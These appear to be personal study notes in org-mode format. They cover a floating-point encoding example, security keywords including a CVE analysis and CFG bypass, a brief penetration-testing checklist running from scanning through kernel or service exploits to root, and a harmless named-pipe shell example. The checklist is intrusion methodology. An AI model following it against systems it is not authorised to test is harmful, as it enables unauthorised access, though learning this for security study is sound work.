     - combining the two parts
       + 1001100.0100110011001... is:
         - in scientific notation, 1.001100 0100110011001... * (2 ** 6).
       + the exponent bias is 127, or 0b01111111.
         - in this case, 127 + 6 = 133 or 0b10000101
       + the mantissa is the representation in scientific notation without the leading 1:
         - in this case, 001100 0100110011001...
       |              0 |      10000101 | 001100 0100110011001... |
       | 0 for positive | 6 + bias(127) | 23-bit mantissa         |
      
     - the final representation is: 0100 0010 1001 1000 1001 1001 1001...

       
* keywords misc
  + cfg bypass
  + [[https://danielmiessler.com/study/red-blue-purple-teams/]]
  + CVE-2017-0199 analysis


* checklist
  + scan
  + service/kernel exploit -> user
  + id/sudo/service/kernel/config enum -> root
    - enum services with root access?

//TODO 
burpsuite
ipython

* linux misc
  
** named pipe
   + info:
   #+begin_quote
   In computing, a named pipe (also known as a FIFO for its behavior) is an extension to the traditional pipe concept on Unix and Unix-like systems, and is one of the methods of inter-process communication (IPC). The concept is also found in OS/2 and Microsoft Windows, although the semantics differ substantially. A traditional pipe is "unnamed" and lasts only as long as the process. *A named pipe, however, can last as long as the system is up, beyond the life of the process*. It can be deleted if no longer used. Usually a named pipe appears as a file, and generally processes attach to it for IPC.
   #+end_quote
   + src:
   #+begin_src sh
   mkfifo my_pipe
   gzip -c < my_pipe > out.gz &
   echo 'a' > my_pipe
   #+end_src
   
